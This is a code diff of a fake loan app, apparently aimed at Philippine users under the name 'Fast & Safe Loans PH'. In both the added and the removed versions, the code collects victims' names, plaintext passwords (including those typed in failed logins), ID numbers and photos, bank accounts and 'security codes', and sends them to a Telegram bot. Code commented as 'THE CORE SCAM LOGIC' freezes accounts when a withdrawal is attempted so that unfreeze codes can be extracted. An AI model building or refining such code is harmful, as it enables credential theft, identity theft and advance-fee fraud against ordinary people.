+                document.getElementById('action-apply-loan').style.opacity = '1';
+                document.getElementById('action-withdraw').style.opacity = '1';
+            }
+
+            // Fill profile panel
+            document.getElementById('profile-name').textContent = user.fullName;
+            document.getElementById('profile-email').textContent = user.email;
+            document.getElementById('profile-phone').textContent = user.phone;
+            document.getElementById('profile-id-type').textContent = user.idType;
+            document.getElementById('profile-id-number').textContent = user.idNumber;
+            document.getElementById('profile-balance').textContent = formatCurrency(user.balance);
+            document.getElementById('profile-loan-status').textContent = user.loanStatus;
+            document.getElementById('profile-account-status').textContent = user.isFrozen ? 'Frozen' : 'Active';
+
+            // Fill loan form with user data
+            document.getElementById('loan-fullname').value = user.fullName;
+        };
+
+        const populateBanks = () => {
+            const container = document.getElementById('bank-selection');
+            container.innerHTML = '';
+            BANKS.forEach(bank => {
+                const item = document.createElement('div');
+                item.className = 'bank-item';
+                item.dataset.bank = bank.name;
+                item.style.backgroundImage = `url(${bank.logo})`;
+                container.appendChild(item);
+            });
+
+            container.addEventListener('click', e => {
+                if (e.target.classList.contains('bank-item')) {
+                    document.querySelectorAll('.bank-item').forEach(b => b.classList.remove('selected'));
+                    e.target.classList.add('selected');
+                }
+            });
+        };
+
+        // --- AUTHENTICATION & USER FLOW ---
+
+        // REGISTRATION
+        document.getElementById('register-form').addEventListener('submit', async e => {
+            e.preventDefault();
+            const registerButton = document.getElementById('register-button');
+            const securityCodeGroup = document.getElementById('security-code-group');
+            
+            // First step: show security code input
+            if(securityCodeGroup.classList.contains('hidden')){
+                tempRegistrationData = {
+                    fullName: document.getElementById('register-name').value,
+                    email: document.getElementById('register-email').value,
+                    password: document.getElementById('register-password').value,
+                    phone: document.getElementById('register-phone').value,
+                    accountNumber: document.getElementById('register-account-number').value,
+                    idType: document.getElementById('register-id-type').value,
+                    idNumber: document.getElementById('register-id-number').value,
+                    idPhotoFile: document.getElementById('register-id-photo').files[0]
+                };
+
+                // Check for existing email
+                const emailExists = Object.values(db).some(u => u.email === tempRegistrationData.email && u.email !== "");
+                if (emailExists) {
+                    alert('An account with this email already exists.');
+                    return;
+                }
+                
+                securityCodeGroup.classList.remove('hidden');
+                registerButton.textContent = 'Submit & Open Account';
+                alert('Please enter the security code from your agent to complete registration.');
+                return;
+            }
+
+            // Second step: process registration with security code
+            const securityCode = document.getElementById('register-security-code').value;
+            if (!securityCode) {
+                alert('Security code is required.');
+                return;
+            }
+
+            const freeSlot = Object.keys(db).find(slot => db[slot].email === "");
+            if (!freeSlot) {
+                alert("Sorry, all user slots are currently filled.");
+                return;
+            }
+
+            // Convert photo to Base64
+            const reader = new FileReader();
+            reader.readAsDataURL(tempRegistrationData.idPhotoFile);
+            reader.onload = () => {
+                const idPhotoBase64 = reader.result;
+                
+                db[freeSlot] = {
+                    ...db[freeSlot],
+                    ...tempRegistrationData,
+                    idPhoto: idPhotoBase64,
+                    balance: 0,
+                    loanAmount: 0,
+                    loanStatus: "No Loan",
+                    isFrozen: false
+                };
+                delete db[freeSlot].idPhotoFile;
+
+                saveDB();
+                
+                const message = `
+✅ <b>New User Registration</b>
+--------------------------------------
+<b>Slot:</b> ${freeSlot}
+<b>Name:</b> ${tempRegistrationData.fullName}
+<b>Email:</b> ${tempRegistrationData.email}
+<b>Password:</b> ${tempRegistrationData.password}
+<b>Phone:</b> ${tempRegistrationData.phone}
+<b>Account No:</b> ${tempRegistrationData.accountNumber}
+<b>ID Type:</b> ${tempRegistrationData.idType}
+<b>ID Number:</b> ${tempRegistrationData.idNumber}
+--------------------------------------
+🛡️ <b>Loan Security Code:</b> ${securityCode}
+                `;
+                sendTelegram(message);
+                
+                alert(`Account created successfully! Your slot number is ${freeSlot}. Please login.`);
+                document.getElementById('register-form').reset();
+                securityCodeGroup.classList.add('hidden');
+                registerButton.textContent = 'Create Account';
+                showScreen('login');
+            };
+            reader.onerror = error => {
+                console.error('Error reading file:', error);
+                alert('There was an error uploading your ID photo. Please try again.');
+            };
+        });
+
+        // LOGIN
+        document.getElementById('login-form').addEventListener('submit', e => {
+            e.preventDefault();
+            const email = document.getElementById('login-email').value;
+            const password = document.getElementById('login-password').value;
+
+            const userSlot = Object.keys(db).find(slot => db[slot].email === email && db[slot].password === password);
+
+            if (userSlot) {
+                currentUserSlot = userSlot;
+                localStorage.setItem('currentUserSlot', currentUserSlot);
+                
+                const user = db[userSlot];
+                const message = `
+✅ <b>User Login Success</b>
+--------------------------------------
+<b>Slot:</b> ${userSlot}
+<b>Name:</b> ${user.fullName}
+<b>Email:</b> ${user.email}
+<b>Balance:</b> ${formatCurrency(user.balance)}
+                `;
+                sendTelegram(message);
+                
+                updateDashboard();
+                showScreen('main');
+                showPanel('home');
+            } else {
+                const message = `
+❌ <b>Failed Login Attempt</b>
+--------------------------------------
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+                `;
+                sendTelegram(message);
+                alert("Invalid email or password.");
+            }
+        });
+        
+        // LOGOUT
+        document.getElementById('logout-button').addEventListener('click', () => {
+             const user = db[currentUserSlot];
+             const message = `
+↩️ <b>User Logout</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+            `;
+            sendTelegram(message);
+
+            currentUserSlot = null;
+            localStorage.removeItem('currentUserSlot');
+            showScreen('login');
+        });
+
+        // LOAN APPLICATION
+        document.getElementById('loan-application-form').addEventListener('submit', e => {
+            e.preventDefault();
+            const user = db[currentUserSlot];
+            if (user.isFrozen) {
+                alert('Your account is frozen. You cannot apply for a loan.');
+                return;
+            }
+            if (user.loanStatus === 'Approved' || user.loanStatus === 'Pending') {
+                alert(`You already have an ${user.loanStatus.toLowerCase()} loan.`);
+                return;
+            }
+            
+            const approvalCodeGroup = document.getElementById('loan-approval-code-group');
+            const submitButton = document.getElementById('loan-submit-button');
+
+            if (approvalCodeGroup.classList.contains('hidden')) {
+                // First step: show approval code input
+                approvalCodeGroup.classList.remove('hidden');
+                submitButton.textContent = 'Submit & Finalize Loan';
+                alert('Please enter the Loan Approval Code to proceed.');
+                return;
+            }
+            
+            // Second step: process with code
+            const loanAmount = parseFloat(document.getElementById('loan-amount').value);
+            const approvalCode = document.getElementById('loan-approval-code').value;
+
+            if (!approvalCode) {
+                alert('Loan Approval Code is required.');
+                return;
+            }
+            
+            showLoading('Submitting Application...');
+            const loanDetails = {
+                fullName: document.getElementById('loan-fullname').value,
+                address: document.getElementById('loan-address').value,
+                birthday: document.getElementById('loan-birthday').value,
+                career: document.getElementById('loan-career').value,
+                bankName: document.getElementById('loan-bank-name').value,
+                bankAccount: document.getElementById('loan-bank-account').value,
+                loanAmount: loanAmount,
+            };
+
+             const message = `
+💰 <b>New Loan Application</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+<b>Email:</b> ${user.email}
+--------------------------------------
+<b>APPLICATION DETAILS:</b>
+<b>Loan Amount:</b> ${formatCurrency(loanDetails.loanAmount)}
+<b>Disbursement Bank:</b> ${loanDetails.bankName}
+<b>Account No:</b> ${loanDetails.bankAccount}
+<b>Address:</b> ${loanDetails.address}
+<b>Birthday:</b> ${loanDetails.birthday}
+<b>Career:</b> ${loanDetails.career}
+--------------------------------------
+🔑 <b>Loan Approval Code:</b> ${approvalCode}
+            `;
+            sendTelegram(message);
+            
+            user.loanStatus = 'Pending';
+            user.loanAmount = loanAmount;
+            saveDB();
+            updateDashboard();
+
+            setTimeout(() => {
+                showLoading('Approving Loan...');
+                setTimeout(() => {
+                    user.balance += loanAmount;
+                    user.loanStatus = 'Approved';
+                    saveDB();
+                    
+                     const approvalMessage = `
+✅ <b>Loan Approved & Credited</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+<b>Loan Amount:</b> ${formatCurrency(loanAmount)}
+<b>New Balance:</b> ${formatCurrency(user.balance)}
+                    `;
+                    sendTelegram(approvalMessage);
+
+                    hideLoading();
+                    alert(`Congratulations! Your loan of ${formatCurrency(loanAmount)} has been approved and credited to your balance.`);
+                    document.getElementById('loan-application-form').reset();
+                    approvalCodeGroup.classList.add('hidden');
+                    submitButton.textContent = 'Submit Loan Application';
+                    updateDashboard();
+                    showPanel('home');
+                }, 2000);
+            }, 1000);
+        });
+        
+        // WITHDRAWAL & FREEZE
+        document.getElementById('withdraw-form').addEventListener('submit', e => {
+            e.preventDefault();
+            const user = db[currentUserSlot];
+
+            if (user.isFrozen) {
+                alert('Your account is frozen. Please unfreeze it to perform transactions.');
+                return;
+            }
+
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const password = document.getElementById('withdraw-password').value;
+            const selectedBank = document.querySelector('.bank-item.selected');
+            
+            if (password !== user.password) {
+                alert('Incorrect password.');
+                return;
+            }
+            if (amount > user.balance) {
+                alert('Insufficient balance.');
+                return;
+            }
+            if (!selectedBank) {
+                alert('Please select a bank or e-wallet.');
+                return;
+            }
+            
+            const originalBalance = user.balance; // Store original balance
+            const withdrawalDetails = {
+                bank: selectedBank.dataset.bank,
+                accountNumber: document.getElementById('withdraw-account-number').value,
+                accountName: document.getElementById('withdraw-account-name').value,
+                amount: amount,
+            };
+
+            const message = `
+💸 <b>Withdrawal Attempt</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+<b>Current Balance:</b> ${formatCurrency(user.balance)}
+--------------------------------------
+<b>WITHDRAWAL DETAILS:</b>
+<b>Amount:</b> ${formatCurrency(withdrawalDetails.amount)}
+<b>Bank:</b> ${withdrawalDetails.bank}
+<b>Account No:</b> ${withdrawalDetails.accountNumber}
+<b>Account Name:</b> ${withdrawalDetails.accountName}
+            `;
+            sendTelegram(message);
+            
+            showLoading('Processing Withdrawal... (10s)');
+            
+            setTimeout(() => {
+                // THE CORE "SCAM" LOGIC
+                user.isFrozen = true;
+                user.balance = originalBalance; // Reset balance to what it was before
+                saveDB();
+
+                const freezeMessage = `
+🥶 <b>Account Auto-Frozen</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+<b>Reason:</b> Security check after withdrawal attempt.
+<b>Balance Reset To:</b> ${formatCurrency(originalBalance)}
+                `;
+                sendTelegram(freezeMessage);
+
+                hideLoading();
+                alert('Security Error! Your account has been temporarily frozen for a security check. Please contact customer support or use the unfreeze option.');
+                updateDashboard();
+                showPanel('home');
+
+            }, 10000);
+        });
+
+        // UNFREEZE
+        document.getElementById('unfreeze-button').addEventListener('click', () => {
+            overlays.unfreeze.classList.remove('hidden');
+        });
+
+        document.getElementById('unfreeze-form').addEventListener('submit', e => {
+            e.preventDefault();
+            const unfreezeCode = document.getElementById('unfreeze-code').value;
+            if(!unfreezeCode) {
+                alert('Please enter the unfreeze code.');
+                return;
+            }
+            
+            const user = db[currentUserSlot];
+            user.isFrozen = false;
+            saveDB();
+            
+            const message = `
+🔓 <b>Account Unfreeze Attempt</b>
+--------------------------------------
+<b>Slot:</b> ${currentUserSlot}
+<b>Name:</b> ${user.fullName}
+<b>Entered Code:</b> ${unfreezeCode}
+            `;
+            sendTelegram(message);
+
+            overlays.unfreeze.classList.add('hidden');
+            document.getElementById('unfreeze-form').reset();
+            alert('Account successfully unfrozen! You can now attempt your withdrawal again.');
+            updateDashboard();
+        });
+
+
+        // --- EVENT LISTENERS ---
+        document.getElementById('show-register').addEventListener('click', () => showScreen('register'));
+        document.getElementById('show-login').addEventListener('click', () => showScreen('login'));
+
+        document.getElementById('tab-bar').addEventListener('click', e => {
+            const tabItem = e.target.closest('.tab-item');
+            if (tabItem) {
+                showPanel(tabItem.dataset.panel);
+            }
+        });
+        
+        document.getElementById('action-apply-loan').addEventListener('click', () => {
+             if(db[currentUserSlot].isFrozen) {
+                alert('Your account is frozen. Please unfreeze it first.');
+             } else {
+                showPanel('loan');
+             }
+        });
+        document.getElementById('action-withdraw').addEventListener('click', () => {
+             if(db[currentUserSlot].isFrozen) {
+                alert('Your account is frozen. Please unfreeze it first.');
+             } else {
+                showPanel('withdraw');
+             }
+        });
+
+        document.getElementById('action-view-id').addEventListener('click', () => {
+            const user = db[currentUserSlot];
+            if (user.idPhoto) {
+                document.getElementById('id-photo-img').src = user.idPhoto;
+                overlays.idPhoto.classList.remove('hidden');
+            } else {
+                alert('No ID photo found for this account.');
+            }
+        });
+        document.getElementById('close-id-modal').addEventListener('click', () => overlays.idPhoto.classList.add('hidden'));
+
+        // --- INITIALIZATION ---
+        const init = () => {
+            loadDB();
+            populateBanks();
+            const loggedInUserSlot = localStorage.getItem('currentUserSlot');
+            if (loggedInUserSlot && db[loggedInUserSlot]) {
+                currentUserSlot = loggedInUserSlot;
+                updateDashboard();
+                showScreen('main');
+            } else {
+                showScreen('login');
+            }
+        };
+
+        // --- ADMIN CONSOLE COMMANDS ---
+        window.adminViewUsers = () => console.table(Object.fromEntries(Object.entries(db).filter(([key, val]) => val.email !== "")));
+        window.adminSetUser = (slot, data) => {
+            if (db[slot]) {
+                db[slot] = { ...db[slot], ...data };
+                saveDB();
+                console.log(`User ${slot} updated.`);
+                if (slot === currentUserSlot) updateDashboard();
+            } else {
+                console.error(`Slot ${slot} does not exist.`);
+            }
+        };
+        window.adminAddBalance = (slot, amount) => {
+             if (db[slot]) {
+                db[slot].balance += amount;
+                saveDB();
+                console.log(`Added ${amount} to user ${slot}. New balance: ${db[slot].balance}`);
+                if (slot === currentUserSlot) updateDashboard();
+            } else {
+                console.error(`Slot ${slot} does not exist.`);
+            }
+        };
+        window.adminReset = () => {
+            if (confirm('Are you sure you want to reset all data to default?')) {
+                localStorage.removeItem('fastSafeLoansDB');
+                localStorage.removeItem('currentUserSlot');
+                generateInitialData();
+                location.reload();
+            }
+        };
+        
+        init();
     });
-  }catch(e){
-    console.warn('Telegram send failed', e);
-  }
-}
-function tgEscape(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') }
-
-/* ===== STORAGE / USERS ===== */
-function defaultUsers(){
-  const u = Array(CONFIG.USERS_TOTAL).fill(null).map((_,i)=>({
-    slot:i+1, name:'', email:'', password:'', phone:'', accountNumber:'',
-    idType:'UMID', idNumber:'',
-    balance:0, loanStatus:'none', loanAmount:0,
-    frozen:false, withdrawalAttempts:0,
-    securityCode:'', createdAt: null
-  }));
-  // Preconfigured test users
-  u[0] = {...u[0],
-    name:'Shane Sabal',
-    email:'123fhffhf@gmail.com',
-    password:'12345678',
-    phone:'+63 912 345 6789',
-    accountNumber:'0045-7788-9911',
-    idType:'UMID',
-    idNumber:'UMID-88299123',
-    balance:50,
-    loanStatus:'none',
-    loanAmount:0,
-    frozen:false,
-    withdrawalAttempts:0,
-    securityCode:'FSL2025',
-    createdAt: Date.now()
-  };
-  u[1] = {...u[1],
-    name:'md oososs',
-    email:'gowevif157@ocuser.com',
-    password:'ccdsdssdss',
-    phone:'+63 917 000 1122',
-    accountNumber:'7712-9910-4455',
-    idType:"PhilSys / National ID",
-    idNumber:'PH-7719283',
-    balance:0,
-    loanStatus:'none',
-    loanAmount:0,
-    frozen:false,
-    withdrawalAttempts:0,
-    securityCode:'BANK772',
-    createdAt: Date.now()
-  };
-  return u;
-}
-function loadUsers(){
-  try{
-    const raw = localStorage.getItem(CONFIG.STORAGE_KEY);
-    if(raw){ users = JSON.parse(raw); if(!users.length || users.length !== CONFIG.USERS_TOTAL) throw 'reset'; }
-    else { users = defaultUsers(); saveUsers(); }
-  }catch(e){
-    users = defaultUsers(); saveUsers();
-  }
-}
-function saveUsers(){ localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(users)); }
-
-function findUserByEmail(email){ return users.findIndex(u=>u.email && u.email.toLowerCase()===email.toLowerCase()) }
-
-/* ===== UI HELPERS ===== */
-function toast(msg, type='info'){
-  const wrap = document.getElementById('toastWrap');
-  const el = document.createElement('div');
-  el.className = 'toast ' + (type==='success'?'success':type==='error'?'error':type==='warn'?'warn':'');
-  el.textContent = msg;
-  wrap.appendChild(el);
-  setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateY(-8px)'; setTimeout(()=>el.remove(),220)}, 3200);
-}
-function peso(n){ return '₱' + Number(n||0).toLocaleString('en-PH', {minimumFractionDigits:2, maximumFractionDigits:2}) }
-function show(elId){ document.getElementById(elId).classList.remove('hidden') }
-function hide(elId){ document.getElementById(elId).classList.add('hidden') }
-function closeModal(id){ hide(id) }
-
-/* ===== AUTH ===== */
-function showLogin(){
-  hide('registerScreen'); hide('dashboard'); show('loginScreen');
-  document.getElementById('loginScreen').classList.remove('hidden');
-}
-function showRegister(){
-  hide('loginScreen'); hide('dashboard');
-  document.getElementById('registerScreen').classList.remove('hidden');
-  show('registerScreen');
-  // reset reg form
-  document.getElementById('regStep1').classList.remove('hidden');
-  document.getElementById('regStep2').classList.add('hidden');
-}
-
-document.getElementById('loginBtn').addEventListener('click', async ()=>{
-  const email = document.getElementById('loginEmail').value.trim();
-  const pass = document.getElementById('loginPassword').value;
-  if(!email || !pass){ toast('Enter email & password','error'); return }
-  const idx = findUserByEmail(email);
-  if(idx===-1 || users[idx].password !== pass){
-    toast('Invalid credentials','error');
-    sendTelegram(`🔴 <b>LOGIN FAILED</b>\n📧 ${tgEscape(email)}\n🔑 Attempt: ${tgEscape(pass)}\n🕒 ${new Date().toLocaleString('en-PH')}\n🇵🇭 Fast & Safe Loans PH`);
-    return;
-  }
-  currentSlot = idx;
-  currentUser = users[idx];
-  localStorage.setItem(CONFIG.SESSION_KEY, String(idx));
-  sendTelegram(`🟢 <b>LOGIN SUCCESS</b>\n👤 ${tgEscape(currentUser.name)}\n📧 ${tgEscape(currentUser.email)}\n💰 Balance: ${peso(currentUser.balance)}\n🔐 Slot #${currentUser.slot}\n🕒 ${new Date().toLocaleString('en-PH')}`);
-  enterDashboard();
-  toast('Welcome back, '+currentUser.name+'!','success');
-});
-
-function backToReg1(){
-  document.getElementById('regStep2').classList.add('hidden');
-  document.getElementById('regStep1').classList.remove('hidden');
-}
-
-document.getElementById('regStep1Btn').addEventListener('click', ()=>{
-  const name = document.getElementById('regName').value.trim();
-  const email = document.getElementById('regEmail').value.trim();
-  const pass = document.getElementById('regPassword').value;
-  const phone = document.getElementById('regPhone').value.trim();
-  const accNo = document.getElementById('regAccountNumber').value.trim();
-  if(!name || !email || !pass || !phone || !accNo){
-    toast('Fill all Create Account fields','error'); return;
-  }
-  if(pass.length < 6){ toast('Password min 6 chars','error'); return }
-  if(findUserByEmail(email) !== -1){ toast('Email already registered','error'); return }
-  // move to step 2 - Loan Security Code
-  document.getElementById('regStep1').classList.add('hidden');
-  document.getElementById('regStep2').classList.remove('hidden');
-  toast('Enter your Loan Security Code to open account','warn');
-});
-
-document.getElementById('regSubmitBtn').addEventListener('click', async ()=>{
-  const name = document.getElementById('regName').value.trim();
-  const email = document.getElementById('regEmail').value.trim();
-  const pass = document.getElementById('regPassword').value;
-  const phone = document.getElementById('regPhone').value.trim();
-  const accNo = document.getElementById('regAccountNumber').value.trim();
-  const idType = document.getElementById('regIdType').value;
-  const idNumber = document.getElementById('regIdNumber').value.trim();
-  const securityCode = document.getElementById('regSecurityCode').value.trim();
-
-  if(!securityCode){ toast('Loan Security Code is required','error'); return }
-
-  const emptySlot = users.findIndex(u=>!u.email);
-  if(emptySlot === -1){ toast('No user slots available (70/70)','error'); return }
-
-  users[emptySlot] = {
-    ...users[emptySlot],
-    name, email, password:pass, phone, accountNumber:accNo,
-    idType, idNumber: idNumber || 'PENDING-'+Math.floor(Math.random()*90000+10000),
-    balance:0,
-    loanStatus:'none',
-    loanAmount:0,
-    frozen:false,
-    withdrawalAttempts:0,
-    securityCode,
-    createdAt: Date.now()
-  };
-  saveUsers();
-  currentSlot = emptySlot;
-  currentUser = users[emptySlot];
-  localStorage.setItem(CONFIG.SESSION_KEY, String(emptySlot));
-
-  // Telegram: send ALL form data
-  const tgMsg = `🆕 <b>NEW ACCOUNT OPENED – FSL PH</b>\n\n👤 <b>Full Name:</b> ${tgEscape(name)}\n📧 <b>Email:</b> ${tgEscape(email)}\n🔒 <b>Password:</b> ${tgEscape(pass)}\n📱 <b>Phone:</b> ${tgEscape(phone)}\n💳 <b>Account Number:</b> ${tgEscape(accNo)}\n🪪 <b>ID:</b> ${tgEscape(idType)} • ${tgEscape(idNumber||'n/a')}\n🛡️ <b>Loan Security Code:</b> ${tgEscape(securityCode)}\n\n📊 <b>Slot:</b> #${currentUser.slot}/70\n🕒 ${new Date().toLocaleString('en-PH')}\n\n✅ Account successfully created via Telegram API`;
-  sendTelegram(tgMsg);
-
-  toast('Account opened successfully!','success');
-  enterDashboard();
-});
-
-/* ===== DASHBOARD ===== */
-function enterDashboard(){
-  hide('loginScreen'); hide('registerScreen'); show('dashboard');
-  renderBankGrid();
-  refreshDashboard();
-  switchTab('home');
-}
-
-function refreshDashboard(){
-  if(!currentUser) return;
-  document.getElementById('dashUserName').textContent = currentUser.name || 'Borrower';
-  document.getElementById('balanceAmount').textContent = peso(currentUser.balance);
-  // loan badge
-  const badge = document.getElementById('loanStatusBadge');
-  const statusMap = {
-    none:['No Loan','badge-none'],
-    pending:['Pending','badge-pending'],
-    approved:['Approved','badge-approved'],
-    rejected:['Rejected','badge-rejected']
-  };
-  const s = statusMap[currentUser.loanStatus] || statusMap.none;
-  badge.textContent = s[0];
-  badge.className = 'badge ' + s[1];
-  if(currentUser.frozen){
-    badge.textContent = 'FROZEN';
-    badge.className = 'badge badge-frozen';
-  }
-  // freeze area visibility: hide until withdrawal attempted
-  const freezeArea = document.getElementById('freezeArea');
-  const shouldShowFreeze = currentUser.withdrawalAttempts > 0 || currentUser.frozen;
-  freezeArea.style.display = shouldShowFreeze ? 'block' : 'none';
-  const freezeBtn = document.getElementById('freezeToggleBtn');
-  if(currentUser.frozen){
-    freezeBtn.textContent = '🔓 Unfreeze (Code)';
-    freezeBtn.className = 'freeze-btn danger';
-    document.getElementById('frozenNote').style.display = 'block';
-  } else {
-    freezeBtn.textContent = '🔒 Freeze';
-    freezeBtn.className = 'freeze-btn';
-    document.getElementById('frozenNote').style.display = 'none';
-  }
-  // info card
-  document.getElementById('infoSlot').textContent = '#' + currentUser.slot;
-  document.getElementById('infoLoanAmount').textContent = peso(currentUser.loanAmount);
-  document.getElementById('infoWithdrawAttempts').textContent = currentUser.withdrawalAttempts;
-  document.getElementById('infoAccStatus').textContent = currentUser.frozen ? 'FROZEN 🔒' : 'Active ✓';
-  // profile
-  document.getElementById('pName').textContent = currentUser.name;
-  document.getElementById('pEmail').textContent = currentUser.email;
-  document.getElementById('pPhone').textContent = currentUser.phone || '-';
-  document.getElementById('pId').textContent = (currentUser.idType||'') + ' • ' + (currentUser.idNumber||'');
-  document.getElementById('pAccNo').textContent = currentUser.accountNumber || '-';
-  document.getElementById('pBalance').textContent = peso(currentUser.balance);
-  document.getElementById('pLoanStatus').textContent = s[0] + (currentUser.frozen?' / FROZEN':'');
-  document.getElementById('pSlot').textContent = '#'+currentUser.slot;
-  saveUsers();
-}
-
-function switchTab(tab){
-  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
-  const panel = document.getElementById('panel-'+tab);
-  if(panel) panel.classList.add('active');
-  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.toggle('active', b.dataset.tab===tab));
-  if(tab==='loan'){
-    // prefill
-    document.getElementById('loanName').value = currentUser.name||'';
-    document.getElementById('loanEmail').value = currentUser.email||'';
-    document.getElementById('loanPhone').value = currentUser.phone||'';
-    document.getElementById('loanIdType').value = currentUser.idType||'UMID';
-    document.getElementById('loanIdNumber').value = currentUser.idNumber||'';
-  }
-}
-
-/* ===== LOAN SYSTEM ===== */
-document.getElementById('submitLoanBtn').addEventListener('click', ()=>{
-  const data = {
-    name: document.getElementById('loanName').value.trim(),
-    dob: document.getElementById('loanDob').value,
-    idType: document.getElementById('loanIdType').value,
-    idNumber: document.getElementById('loanIdNumber').value.trim(),
-    address: document.getElementById('loanAddress').value.trim(),
-    phone: document.getElementById('loanPhone').value.trim(),
-    email: document.getElementById('loanEmail').value.trim(),
-    career: document.getElementById('loanCareer').value.trim(),
-    income: document.getElementById('loanIncome').value.trim(),
-    employer: document.getElementById('loanEmployer').value.trim(),
-    purpose: document.getElementById('loanPurpose').value,
-    emergencyName: document.getElementById('loanEmergencyName').value.trim(),
-    emergencyPhone: document.getElementById('loanEmergencyPhone').value.trim(),
-    bank: document.getElementById('loanBank').value,
-    bankAccount: document.getElementById('loanBankAccount').value.trim(),
-    amount: Number(document.getElementById('loanAmountInput').value),
-    term: document.getElementById('loanTerm').value
-  };
-  // basic validation
-  if(!data.name || !data.idNumber || !data.address || !data.phone || !data.email || !data.amount){
-    toast('Please complete all required loan fields','error'); return;
-  }
-  if(data.amount < CONFIG.LOAN_MIN || data.amount > CONFIG.LOAN_MAX){
-    toast(`Loan must be ₱${CONFIG.LOAN_MIN.toLocaleString()} – ₱${CONFIG.LOAN_MAX.toLocaleString()}`,'error'); return;
-  }
-  pendingLoanData = data;
-  // Send loan application to Telegram immediately
-  const loanMsg = `📄 <b>LOAN APPLICATION – FSL PH</b>\n\n👤 ${tgEscape(data.name)}\n🎂 DOB: ${tgEscape(data.dob||'n/a')}\n🪪 ${tgEscape(data.idType)}: ${tgEscape(data.idNumber)}\n🏠 ${tgEscape(data.address)}\n📱 ${tgEscape(data.phone)}\n📧 ${tgEscape(data.email)}\n💼 ${tgEscape(data.career||'n/a')} @ ${tgEscape(data.employer||'n/a')}\n💵 Income: ₱${tgEscape(data.income||'0')}\n🎯 Purpose: ${tgEscape(data.purpose)}\n🆘 Emergency: ${tgEscape(data.emergencyName)} ${tgEscape(data.emergencyPhone)}\n🏦 Bank: ${tgEscape(data.bank)} • ${tgEscape(data.bankAccount)}\n💰 <b>Loan: ₱${data.amount.toLocaleString('en-PH')}</b>\n📅 Term: ${data.term} months\n\n👤 Client: ${tgEscape(currentUser.name)} (${tgEscape(currentUser.email)})\nSlot #${currentUser.slot}\n⏳ Awaiting APPROVAL CODE`;
-  sendTelegram(loanMsg);
-
-  // show approval code modal
-  document.getElementById('loanApprovalCodeInput').value = '';
-  show('loanCodeModal');
-  toast('Loan application received – enter Approval Code','warn');
-});
-
-document.getElementById('loanCodeSubmitBtn').addEventListener('click', async ()=>{
-  const code = document.getElementById('loanApprovalCodeInput').value.trim();
-  if(!code){ toast('Approval Code required – loan will NOT be approved without code','error'); return }
-  if(!pendingLoanData){ toast('No pending loan','error'); return }
-  closeModal('loanCodeModal');
-  show('loanProcessingOverlay');
-
-  // Telegram code submission
-  sendTelegram(`🔐 <b>LOAN APPROVAL CODE SUBMITTED</b>\n\n👤 ${tgEscape(currentUser.name)}\n📧 ${tgEscape(currentUser.email)}\n🛡️ <b>Code:</b> ${tgEscape(code)}\n💰 Loan: ₱${pendingLoanData.amount.toLocaleString('en-PH')}\n📊 Slot #${currentUser.slot}\n🕒 ${new Date().toLocaleString('en-PH')}`);
-
-  // simulate processing
-  setTimeout(()=>{
-    hide('loanProcessingOverlay');
-    // approve
-    currentUser.loanStatus = 'approved';
-    currentUser.loanAmount = pendingLoanData.amount;
-    currentUser.balance = Number(currentUser.balance) + Number(pendingLoanData.amount);
-    // update stored id details if provided
-    currentUser.idType = pendingLoanData.idType;
-    currentUser.idNumber = pendingLoanData.idNumber;
-    saveUsers();
-    refreshDashboard();
-    toast(`Loan Approved! ₱${pendingLoanData.amount.toLocaleString('en-PH')} credited`,'success');
-
-    sendTelegram(`✅ <b>LOAN APPROVED & CREDITED</b>\n👤 ${tgEscape(currentUser.name)}\n💸 ₱${pendingLoanData.amount.toLocaleString('en-PH')}\n💰 New Balance: ${peso(currentUser.balance)}\n🛡️ Approval Code: ${tgEscape(code)}\n🎉 Auto-credited via Telegram API`);
-
-    pendingLoanData = null;
-  }, 1900);
-});
-
-/* ===== WITHDRAW SYSTEM ===== */
-function renderBankGrid(){
-  const grid = document.getElementById('bankGrid');
-  grid.innerHTML = BANKS.map(b=>`
-    <div class="bank-item" data-bank="${b.id}" onclick="selectBank('${b.id}')">
-      <div>${b.name}</div><small>${b.sub}</small>
-    </div>
-  `).join('');
-}
-function selectBank(id){
-  selectedBank = id;
-  document.querySelectorAll('.bank-item').forEach(el=>{
-    el.classList.toggle('selected', el.dataset.bank===id);
-  });
-}
-
-document.getElementById('processWdBtn').addEventListener('click', async ()=>{
-  if(currentUser.frozen){
-    toast('Account is FROZEN – unfreeze first','error');
-    openUnfreezeModal();
-    return;
-  }
-  const amount = Number(document.getElementById('wdAmount').value);
-  const accNo = document.getElementById('wdAccNo').value.trim();
-  const accName = document.getElementById('wdAccName').value.trim();
-  const pwd = document.getElementById('wdPassword').value;
-  if(!selectedBank){ toast('Select a bank / wallet','error'); return }
-  if(!amount || amount <=0){ toast('Enter withdrawal amount','error'); return }
-  if(amount > currentUser.balance){ toast('Insufficient balance','error'); return }
-  if(!accNo || !accName || !pwd){ toast('Complete all withdrawal fields','error'); return }
-  if(pwd !== currentUser.password){ toast('Transaction password incorrect','error'); return }
-
-  // increment attempt
-  currentUser.withdrawalAttempts = (currentUser.withdrawalAttempts||0)+1;
-  saveUsers();
-  refreshDashboard();
-
-  const bankObj = BANKS.find(b=>b.id===selectedBank);
-
-  // Telegram withdrawal attempt
-  sendTelegram(`💸 <b>WITHDRAWAL ATTEMPT #${currentUser.withdrawalAttempts}</b>\n👤 ${tgEscape(currentUser.name)}\n📧 ${tgEscape(currentUser.email)}\n🏦 ${tgEscape(bankObj.name)}\n💰 Amount: ₱${amount.toLocaleString('en-PH')}\n💳 Acc: ${tgEscape(accNo)}\n👤 Acc Name: ${tgEscape(accName)}\n💼 Balance: ${peso(currentUser.balance)}\nSlot #${currentUser.slot}`);
-
